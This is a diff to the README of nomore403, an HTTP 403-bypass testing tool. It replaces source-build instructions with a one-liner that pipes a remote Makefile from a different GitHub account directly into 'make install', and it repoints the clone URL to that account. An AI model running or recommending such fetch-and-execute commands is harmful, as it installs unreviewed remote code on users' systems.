@@ -43,21 +43,21 @@ This tool does not "break authentication" by itself. It helps find differences b
 
 ## Installation
 
-### Build from source
+### Global Installation (Zero Download)
+
+If you want to install the tool globally without cloning the repository or downloading any files manually, run this one-liner. It pulls the setup configuration, deploys the required asset payloads to your home directory, and installs the binary system-wide.
 
 ```bash
-git clone https://github.com/devploit/nomore403
-cd nomore403
-go build
+curl -sSL https://raw.githubusercontent.com/R0X4R/nomore403/main/Makefile | make -f - install
 ```
 
-### Install with Go
+### Local Build from Source
+
+Use this method if you want to inspect the source code, modify the project, or build a local executable binary inside your current working directory.
 
 ```bash
-go install github.com/devploit/nomore403@latest
+git clone https://github.com/R0X4R/nomore403 && cd nomore403 && make build
 ```
-
-If you install with `go install`, the `payloads/` directory is not installed automatically. Clone the repository and point the tool to that directory with `-f` if needed.
 
 ## Requirements
 
